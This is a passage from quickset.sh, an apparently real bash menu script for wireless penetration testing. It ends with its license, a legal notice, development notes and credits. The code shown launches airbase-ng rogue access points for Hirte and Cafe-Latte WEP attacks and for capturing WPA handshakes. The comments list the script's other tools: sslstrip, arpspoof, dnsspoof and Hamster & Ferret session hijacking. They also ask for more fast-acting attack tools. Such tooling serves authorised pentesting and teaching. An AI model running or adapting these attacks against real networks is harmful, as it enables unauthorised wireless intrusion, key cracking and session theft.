2) SoftAP BSSID [$out$b$inp]

3) Tgt ESSID    [$out$e$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) parent_VI="ctech"
		tchan--;;

		2) echo -e "$inp\nDesired SoftAP BSSID?"
		read b
		ctech_II--;;

		3) echo -e "$inp\nTgt ESSID?"
		read e
		ctech_II--;;

		c|C) if [[ -z $tc || -z $b || -z $e ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			ctech_II--
		fi;;

		p|P) ctech--;;

		m|M) main_menu--;;

		*) ctech_II--;;
	esac

	st_1--
	clear
	case $ct in
		1) Eterm -b black -f white --pause --title "Hirte (AP)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 &
		sleep 2;;

		2) Eterm -b black -f white --pause --title "Hirte (Ad-Hoc)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 -A &
		sleep 2;;

		3) Eterm -b black -f white --pause --title "Cafe-Latte" -e airbase-ng $pii -c $tc -e "$e" -L -W 1 &
		sleep 2;;

		4) parent_VI="ctech"
		cfile--;;
	esac

	ctech--
	}
##~~~~~~~~~~~~~~~~~ END wifi_101-- ctech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- WPA-- sub-functions ~~~~~~~~~~~~~~~~~~~##
	WPA_II--()
	{
	wpa_pid= ## PID for WPA attack Airodump-NG scan
	case $spec in
		1) case $wifu in
			1|2|3) wpa_warn--
			Eterm -b black -f white --pause --title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -F ab_$cf & wpa_pid=$! ;;

			7|8|9) wpa_warn--
			Eterm -b black -f white --pause --title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -y -F ab_$cf & wpa_pid=$! ;;
		esac;;

		2) wpa_warn--
		Eterm -b black -f white --pause --title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 $all_probe -F ab_$cf & wpa_pid=$! ;;
	esac

	WPA--
	}
##~~~~~~~~~~~~~~~~~~~~~ END wifi_101-- WPA-- sub-functions ~~~~~~~~~~~~~~~~~~~~##
## wifi_101-- Launcher
sm=$(ifconfig $pii | grep --color=never HWaddr | awk '{print $5}' | cut -c1-17 | tr [:upper:] [:lower:] | sed 's/-/:/g')
venue--
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ END wifi_101-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
current_ver=3.8
rel_date="10 March 2013"
envir--
if [[ "$UID" -ne 0 ]];then
	echo -e "$wrn\nMust be ROOT to run this script"
	exit 87
fi

if [[ -z $1  ]]; then
	phys_dev= ## Physical NIC variable
	kill_mon= ## Variable to determine if the "killing a monitor mode option" has been selected
	dev_check= ## Nulled

	ie=$(route -en | grep UG | awk '{print $8}' | head -n1)
	if [[ -n $ie ]];then
		ie=$(ifconfig $ie | awk '{print $1}' | head -n1)
	fi

	pii=$(iwconfig | grep -i monitor | awk '{print $1}' | head -n1)
	greet--
else
	usage--
fi
##~~~~~~~~~~~~~~~~~~~~~~~~~ END Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


function script_info(){
##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Filename: quickset.sh
## Copyright (C) <2009>  <stryngs>

##  This program is free software: you can redistribute it and/or modify
##  it under the terms of the GNU General Public License as published by
##  the Free Software Foundation, either version 3 of the License, or
##  (at your option) any later version.

##  This program is distributed in the hope that it will be useful,
##  but WITHOUT ANY WARRANTY; without even the implied warranty of
##  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##  GNU General Public License for more details.

##  You should have received a copy of the GNU General Public License
##  along with this program.  If not, see <http://www.gnu.org/licenses/>.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Legal Notice ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## This script was written with the intent for Legal PenTesting uses only.
## Make sure that you have consent prior to use on a device other than your own.
## Doing so without the above is a violation of Federal/State Laws within the United States of America.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##_____________________________________________________________________________##
## Prior to usage, I ask that you take the time to read fully through the script to understand the dynamics of the script.  Don't just be a $cr!pt K!dd!3 here; actually understand what it is that you are doing.

## I consider any script/program I write to always be a work in progress.  Please send any tips/tricks/streamlining ideas/comments/kudos via email to info [at] ethicalreporting.org

## Comments written with a triple # are notes to myself, please ignore them.
##_____________________________________________________________________________##


##~The Following Required Programs Must be in Your Path for Full Functionality~##
## This was decided as the de facto standard versus having the script look in locations for the programs themselves with the risk of them not being there.  Odds favor that they will be in /usr/bin or some other location readily available in your path...
## macchanger
## Hamster & Ferret
## sslstrip
## arpspoof
## aircrack-ng suite
## dhcpd3-server
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Requested Help ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## WOULD LIKE TO IMPLEMENT MORE FAST ACTING ATTACK TOOLS THAT REQUIRE LITTLE TO NO SETUP.  If you have a tool you would like added to this script please contact me
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Implementation of ip_mac-- for MAC address checking
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Add option to delete the files created by aircrack-ng during usage of wifi_101--()

## Implementation of IP check functionality for multiple tgts on arpspoof_II--() and custom dns entries on dhcp_svr--()

## ip_mac--() needs to be vetted to where it will only accept four octects.  As of now, it does proper checking with regards to 0-255, however it will let ANY amount of octects pass -vs- the proper usage of four octects

## Tweak up wacg--() to allow for a null victim mac entry to exit out of the function and the pause that would follow otherwise..,
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Development Notes ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Past notes are within wifi_101.sh <Version 1.5 (FINAL)>
## To grab a deprecated copy of wifi_101.sh do: svn checkout http://wifi-101.googlecode.com/svn/trunk wifi_101

## If you have devices listed as ath0 or something other than wlan or mon, you will have to make appropriate changes to the naming and monitormode functions

## $var is a recycled variable throughout the script.  $parent is a variable declaring where a function is called from.

## One of the tougher parts of designing this script was weighing in on which programs to include, originally I had decided to implement a KarMetasploit attack.  I later decided against it; instead deciding to focus on smaller programs; with the thought concept that this script is not meant to be an all encompassing tool, but one designed to setup "Quick Fixes".....

## For Functions within Functions (sub-functions), I have found that I like to declare my variables for use within a function at the beginning of the function, then I list my sub-functions, at the end of the sub-functions you will find the parent functions commands.  It may be a strange way to do it, but it works for my readability purposes.

## As of version 0.9, the old "Amplification Mode" has been removed.  It was more of a multiplication technique.
## With the advent of version 1.3 a proper technique for ARP amplification has been added in that will allow the user to do advanced Packet Forging thereby creating real amplification methods.

## As of version 1.5, the option for Automatic WEP attacks has been removed.  I wanted to keep it in, but there are so many variables with respect towards WEP cracking that until a GUI option for quickset exists, it will not be feasible to have this option.

## init_setup--() has been clarified.  The old menu was very confusing with regards to creating variables for NIC names, enabling monitor mode, etc...  The new menu is a lot more "user" friendly 

##  On 2 Jan 2012, no_dev--() was implemented to speed up NIC naming, whereby if a user had neglected to name NICs during the initial setup; it would not slow them down later on.

## On 7 January 2012, Eterm replaced xterm.  This is a much slicker program.

## On 27 January 2012, an IP address check function was implemented to ensure that a valid IP address exists for IP address variables.  This still has some work to do to it regarding making sure it has 4 octets and 4 octets only.  This will surely be implemented later on.

## On 20 February 2012, the ranges for MTU value have been confirmed to be between 42 - 6122.  This check feature has now been fully implemented.
##As well, quickset.sh was opened to the world with respect towards allowed frequencies for WiFi.  quickset.sh will now allow a user to choose channels 1-14, versus the old way of using only 1-11.  Be advised though, I do not feel like writing a check function to make sure yer regulatory agent allows a specific channel.  It is up to you to set the regulatory agent via iw prior to choosing a channel.  ie...  If you have an american laptop, by default, channel 1-11 will be available to you.  Trying to choose channel 12 will probably result in a failure of quickset.sh of some type, not sure and do not care enough to figure this out right now.  Just make sure you have set it prior to using quickset.sh and you will be good to go.

## On 20 March 2012, quickset.sh once again became an even numbered version indicating to users that all known bugs have been worked out with the previous bug caused by the addition of a function allowing for implementation of using custom DNS servers with dhcp3-server!  It's still not perfect sailing as I have not implemented the ip_mac--() function into this just yet, the user could still jack this up, but I will implement this when I get the time.

## As of 3.4:
## A channel checking feature was implemented to speed up the users decision with regards to channel switching
## An internet connectivity and monitor mode check was implemented during startup 
## dnsspoof has been given the ability to use custom hosts for the configuration file
## When using wacg--(), you must have a victim MAC to enter in, otherwise the script will pause.  In other words, do not (C)ontinue if there is not a vic to choose from...
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Airbase-NG usage results in an iPhone constantly reassociating every minute on the minute
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## First and foremost, to God above for giving me the abilities I have, Amen.

## My main scripting style is derived from carlos_perez@darkoperator.com
## Credit for some of the routing features in this script to him as well

## Grant Pearson:
## For having me RTFM with xterm debugging

## comaX:
## Showing me how much easier it is to follow conditional statements if blank spaces are added in.  This comes in really handy with editors like Kate with folding markers shown.
## Credit for the variable parser within mass_arp--()

## ShadowMaster:
## Showing me the error of my ways with what I thought was "ARP Amplification".
## Due to his thoughts on the matter, I have completly rewritten the wifi_101--() portion of this script.

## melissabubble:
## Informing me about the "The Wireless Vaccuum" and "WiFi Range Extender" not working properly.  After careful study of the functions I came to the conclusion listed under the "Development Notes" up top.
## Props on finding the "Enable Monitor Mode" bug.  I'm not sure if that was in previous versions and darn sure to feel like trying to find out.  Either way, darn fine job finding it and pointing it out.  Using the wrong NIC could have had "serious" consequences depending on the situation of a pentest.

## VulpiArgenti:
## Recommending the idea of an auto-implementing needed requirements for functions such as "Wireless Vaccuum" whereby packet forwarding is needed at the Kernel Level.
## After much thought and deliberation, I implemented a check that will ask the user if they would like to turn on said named feature prior to proceeding.  Eventually this check will be implemented in all quickset.sh functions that should require the usage thereof...
## For giving me the idea to allow channels 12-14 with respect to wifi capabilities.  I had always used US channels in the past, but why not open this up to other channels.....
## For the rockin syntax with respect to Enabling Monitor Mode by grepping out airmon-ng's output to enter the variable automatically.  This saved some time with respect to the quick in quickset, nice job!
## Mad credit goes into the idea for keeping the "quick" in quickset by having the script call for the NICs MAC address ahead of time with regards to source MAC for some of the attacks.  When I first read the post, I was a little lost, and disregarded this idea for quite some time.  It wasn't until around a month later that I realized the genius behind the idea and scripted something up.  Props my friend, props....
## I have now "implemented" your color coding scheme from PwnSTAR.  The old way I did things was painful.  It rocks hard for the visualization of ANSI layout and it helped me to catch some symetrics errors.  Nice job...

## bugme:
## Catching the hamster bug whereby if hamster.txt existed, the script just quit out.  Thanks!

## b33f:
## Much of the wacg--() functionality is straight from the WACg.sh script, I mostly tweaked how the function flows within itself for my script's purposes.  All the credit for the idea itself goes straight to b33f.  Mad Props and Kudos...

## My wife:
## For always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
sleep 0
}
